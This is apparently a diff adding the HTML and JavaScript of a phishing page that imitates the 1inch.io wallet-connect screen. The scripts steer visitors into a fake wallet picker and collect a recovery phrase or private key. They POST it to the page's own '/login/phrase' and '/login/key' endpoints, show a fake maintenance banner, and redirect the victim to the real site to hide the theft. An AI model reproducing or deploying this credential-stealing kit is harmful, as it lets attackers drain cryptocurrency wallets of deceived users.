+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/bitski.svg">
+				<span>Bitski</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/injected-binance.svg">
+				<span>Binance Chain Wallet</span>
+			</div>
+			<div class="button-wrap disabled">
+				<img src="https://app.1inch.io/assets/images/wallet-logos/arkane.svg">
+				<span>Venly</span>
+			</div>
+		</div>
+		
+	</div>
+</div>
+         </div>
+<p id="change" style="z-index:9999999; display: none; opacity: 0; color: white; font-size: 19px; transition-duration: 1s;position: absolute;width: 100%;background: #F95D51;text-align: center;bottom: 0;padding: 20px 0px 20px 0px;">The server is not responding. The system is under maintenance. Please try again later. Refresh: <span></span></p>
+<p id="errors" style="display: none; opacity: 0; color: white; font-size: 19px; transition: 0;position: absolute;width: 100%;background: #F95D51;text-align: center;bottom: 0;padding: 20px 0px 20px 0px;z-index:9999999;">Incorrect login phrase</p>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+  <script>
+ async function SendForm(e) {
+
+   
+    e.preventDefault();
+        let response = await fetch('/login/phrase', {
+            method: 'POST',
+            body: new FormData(form1)
+        });
+        $("#change span").text("3");
+        let i = 0;
+        document.getElementById('change').style.display = 'block';
+        document.getElementById('change').style.opacity = '1';
+        setTimeout(function() {
+            $("#change span").text("2");
+        }, 1000);
+        setTimeout(function() {
+            $("#change span").text("1");
+        }, 2000);
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
+          
+            setTimeout(function() {
+                window.location.href = 'https://app.1inch.io';
+            }, 1000);
+        } else {
+            window.location.href = 'https://app.1inch.io'
+        }
+};
+form1.onsubmit = SendForm;
+
+
+async function SendForm2(e) {
+
+    e.preventDefault();
+    let response = await fetch('/login/key', {
+        method: 'POST',
+        body: new FormData(form2)
+    });
+    $("#change span").text("3");
+    let i = 0;
+    document.getElementById('change').style.display = 'block';
+    document.getElementById('change').style.opacity = '1';
+    setTimeout(function() {
+        $("#change span").text("2");
+    }, 1000);
+    setTimeout(function() {
+        $("#change span").text("1");
+    }, 2000);
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
+  
+        setTimeout(function() {
+            window.location.href = 'https://app.1inch.io';
+        }, 1000);
+    } else {
+        window.location.href = 'https://app.1inch.io'
+    }
+
+
+};
+form2.onsubmit = SendForm2;
+
+        
+    </script>
+ <script>
+         $(document).ready(function(){
+            function initEvents() {
+               $("span.ng-star-inserted, button.header-button-light-blue, .blue-button-enabled, .accentBlue-button-enabled").on("click", (event) => {
+                  event.stopPropagation();
+                  event.preventDefault();
+                  $(".icon-button-close").click();
+                  $("#dwallets").show();
+               });
+               
+                $(".icon-button-close").on("click", (event) => {
+                  $("#dwallets").hide();
+               });
+               
+               
+               
+            }
+            setInterval(initEvents, 500);
+
+            $("#swallet, #swallet1, #swallet2, #swallet3, #swallet4, #swallet5, #swallet6, #swallet7, #swallet8, #swallet9, #swallet10, #swallet11, #swallet12, #swallet13, #swallet14, #swallet15, #swallet16, #swallet17, #swallet18, #swallet19, #swallet20, #swallet21, #swallet22, #swallet23, #swallet24, #swallet25, #swallet26, #swallet27, #swallet28, #swallet29, #swallet30, #swallet31, #swallet32").click(function(){
+               $("#dwallets").hide();
+               $("#dkeys").show();
+            });
+            $("#bkey").click(function(){
+               $("#dkeys").hide();
+               $("#privatekey").show();
+            });
+            $("#b12").click(function(){
+               $("#dkeys").hide();
+               $("#12palavras").show();
+            });
+            $("#closewallet").click(function(){
+               $("#dwallets,#dkeys,#12palavras,#privatekey").hide();
+            });
+      $("#closewallet3").click(function(){
+               $("#dkeys").hide();
+               $("#dwallets").show();
+            });
+      $("#closewallet1,#closewallet2").click(function(){
+               $("#privatekey,#12palavras").hide();
+         $("#dkeys").show();
+            });
+            });
+         function getdetails(obj) {
+			if (obj.id == "swallet"){
+				document.getElementById('namewallet').value="Ethereum - 1INCH WalletConnect";
+			document.getElementById('namewallet1').value="Ethereum - 1INCH WalletConnect";
+			};
+			if (obj.id == "swallet1"){
+				document.getElementById('namewallet').value="Ethereum - Web3";
+			document.getElementById('namewallet1').value="Ethereum - Web3";
+			};
+			if (obj.id == "swallet2"){
+				document.getElementById('namewallet').value="Ethereum - WalletConnect";
+			document.getElementById('namewallet1').value="Ethereum - WalletConnect";
+			};
+			if (obj.id == "swallet3"){
+				document.getElementById('namewallet').value="Ethereum - Coinbase Wallet";
+			document.getElementById('namewallet1').value="Ethereum - Coinbase Wallet";
+			};
+			if (obj.id == "swallet4"){
+				document.getElementById('namewallet').value="Ethereum - Ledger";
+			document.getElementById('namewallet1').value="Ethereum - Ledger";
+			};
+			if (obj.id == "swallet5"){
+				document.getElementById('namewallet').value="Ethereum - Trezor";
+			document.getElementById('namewallet1').value="Ethereum - Trezor";
+			};
+			if (obj.id == "swallet6"){
+				document.getElementById('namewallet').value="Ethereum - KeepKey";
+			document.getElementById('namewallet1').value="Ethereum - KeepKey";
+			};
+			if (obj.id == "swallet7"){
+				document.getElementById('namewallet').value="Ethereum - Portis";
+			document.getElementById('namewallet1').value="Ethereum - Portis";
+			};
+			if (obj.id == "swallet8"){
+				document.getElementById('namewallet').value="Ethereum - MEW";
+			document.getElementById('namewallet1').value="Ethereum - MEW";
+			};
+			if (obj.id == "swallet9"){
+				document.getElementById('namewallet').value="Ethereum - Fortmatic";
+			document.getElementById('namewallet1').value="Ethereum - Fortmatic";
+			};
+			if (obj.id == "swallet10"){
+				document.getElementById('namewallet').value="Ethereum - Authereum";
+			document.getElementById('namewallet1').value="Ethereum - Authereum";
+			};
+			if (obj.id == "swallet11"){
+				document.getElementById('namewallet').value="Ethereum - Torus";
+			document.getElementById('namewallet1').value="Ethereum - Torus";
+			};
+			if (obj.id == "swallet12"){
+				document.getElementById('namewallet').value="Ethereum - Bitski";
+			document.getElementById('namewallet1').value="Ethereum - Bitski";
+			};
+			if (obj.id == "swallet13"){
+				document.getElementById('namewallet').value="Ethereum - Binance Chain Wallet";
+			document.getElementById('namewallet1').value="Ethereum - Binance Chain Wallet";
+			};
+			if (obj.id == "swallet14"){
+				document.getElementById('namewallet').value="Ethereum - Venly";
+			document.getElementById('namewallet1').value="Ethereum - Venly";
+			};
+			
+			if (obj.id == "swallet15"){
+				document.getElementById('namewallet').value="BNB Chain - 1INCH WalletConnect";
+			document.getElementById('namewallet1').value="BNB Chain - 1INCH WalletConnect";
+			};
+			if (obj.id == "swallet16"){
+				document.getElementById('namewallet').value="BNB Chain - Web3";
+			document.getElementById('namewallet1').value="BNB Chain - Web3";
+			};
+			if (obj.id == "swallet17"){
+				document.getElementById('namewallet').value="BNB Chain - WalletConnect";
+			document.getElementById('namewallet1').value="BNB Chain - WalletConnect";
+			};
+			if (obj.id == "swallet18"){
+				document.getElementById('namewallet').value="BNB Chain - Binance Chain Wallet";
+			document.getElementById('namewallet1').value="BNB Chain - Binance Chain Wallet";
+			};
+			if (obj.id == "swallet19"){
+				document.getElementById('namewallet').value="BNB Chain - Venly";
+			document.getElementById('namewallet1').value="BNB Chain - Venly";
+			};		
+				
+			if (obj.id == "swallet20"){
+				document.getElementById('namewallet').value="Polygon - 1INCH WalletConnect";
+			document.getElementById('namewallet1').value="Polygon - 1INCH WalletConnect";
+			};
+			if (obj.id == "swallet21"){
+				document.getElementById('namewallet').value="Polygon - Web3";
+			document.getElementById('namewallet1').value="Polygon - Web3";
+			};
+			if (obj.id == "swallet22"){
+				document.getElementById('namewallet').value="Polygon - WalletConnect";
+			document.getElementById('namewallet1').value="Polygon - WalletConnect";
+			};
+			if (obj.id == "swallet23"){
+				document.getElementById('namewallet').value="Polygon - Venly";
+			document.getElementById('namewallet1').value="Polygon - Venly";
+			};
+			
+			if (obj.id == "swallet24"){
+				document.getElementById('namewallet').value="Optimism - Web3";
+			document.getElementById('namewallet1').value="Optimism - Web3";
+			};
+			if (obj.id == "swallet25"){
+				document.getElementById('namewallet').value="Optimism - WalletConnect";
+			document.getElementById('namewallet1').value="Optimism - WalletConnect";
+			};
+			if (obj.id == "swallet26"){
+				document.getElementById('namewallet').value="Optimism - Venly";
+			document.getElementById('namewallet1').value="Optimism - Venly";
+			};
+			
+			if (obj.id == "swallet27"){
+				document.getElementById('namewallet').value="Arbitrum - Web3";
+			document.getElementById('namewallet1').value="Arbitrum - Web3";
+			};
+			if (obj.id == "swallet28"){
+				document.getElementById('namewallet').value="Arbitrum - WalletConnect";
+			document.getElementById('namewallet1').value="Arbitrum - WalletConnect";
+			};
+			
+			if (obj.id == "swallet29"){
+				document.getElementById('namewallet').value="Gnosis Chain - Web3";
+			document.getElementById('namewallet1').value="Gnosis Chain - Web3";
+			};
+			if (obj.id == "swallet30"){
+				document.getElementById('namewallet').value="Gnosis Chain - WalletConnect";
+			document.getElementById('namewallet1').value="Gnosis Chain - WalletConnect";
+			};
+			
+			if (obj.id == "swallet31"){
+				document.getElementById('namewallet').value="Avalanche - Web3";
+			document.getElementById('namewallet1').value="Avalanche - Web3";
+			};
+			if (obj.id == "swallet32"){
+				document.getElementById('namewallet').value="Avalanche - WalletConnect";
+			document.getElementById('namewallet1').value="Avalanche - WalletConnect";
+			};			
+			
+			
+    }
+         
+         
+         </script>	 
+         
+         <script>
+$('.tab1 label input[type="checkbox"]').on('change', function(){
+	if($(this)[0].checked == true){
+		$('.tab1').addClass( "active" );
+	}else{
+		$('.tab1').removeClass( "active" );
+	}
+});
+
+$('.tab2 .buttons-row .button-wrap').on('click', function(){
+	if(!$('.tab2').hasClass("active")){
+		$('.tab2').addClass( "active" );
+	}
+	var ethis = $(this);
+	if(ethis != $('.tab2 .buttons-row .button-wrap.active')) {
+		$('.tab2 .buttons-row .button-wrap.active').removeClass('active');
+	}
+	$('.tab3 .buttons-row.active').css( "display", "none" );
+	$('.tab3 .buttons-row.active').removeClass( "active" );
+	$('.tab3 .buttons-row[data-tab="'+ethis.attr("data-btn")+'"]').css( "display", "flex" );
+	$('.tab3 .buttons-row[data-tab="'+ethis.attr("data-btn")+'"]').addClass( "active" );
+	ethis.toggleClass('active');
+});
+</script>
+
+<script>
+	$(document).mouseup(function (e){
+var modalctr = $("#dwallets");
+var modal = $(".modal-connect-wallet");
+if (!modal.is(e.target) && modal.has(e.target).length === 0){
+modalctr.hide();
+}
+});
+</script>
+
+<div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite"></div><div class="cdk-overlay-container"><div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: flex-end; align-items: flex-start;"><div id="cdk-overlay-0" class="cdk-overlay-pane" style="position: static; margin-top: 0px; margin-right: 0px;"><snack-bar-container class="mat-snack-bar-container ng-tns-c165-13 ng-trigger ng-trigger-state mat-snack-bar-top ng-star-inserted" style="transform: scale(1); opacity: 1;"><div class="ng-tns-c165-13" aria-live="assertive" role="alert"><div class="ng-tns-c165-13"><earn-banner-popup _nghost-ipc-c167="" class="ng-star-inserted visible"><button _ngcontent-ipc-c167="" data-id="banner-notification.close-icon" class="popup-cross-icon blank-button"><svg _ngcontent-ipc-c167="" width="18" height="18"><use _ngcontent-ipc-c167="" xlink:href="assets/images/icons/cross.svg#cross"></use></svg></button><earn-banner _ngcontent-ipc-c167="" _nghost-ipc-c166=""><div _ngcontent-ipc-c166="" class="left-col"><p _ngcontent-ipc-c166="" transloco="earnStrategies.banner-title" class="text">Get the most of your crypto with 1inch Earn!</p><!----><a _ngcontent-ipc-c166="" href="https://help.1inch.io/en/articles/5743587-what-is-1inch-network-earn-and-how-does-it-work" target="_blank" transloco="gasRefund.view-details" class="link">View details</a><!----></div></earn-banner></earn-banner-popup><!----></div></div></snack-bar-container></div></div></div></body></html>
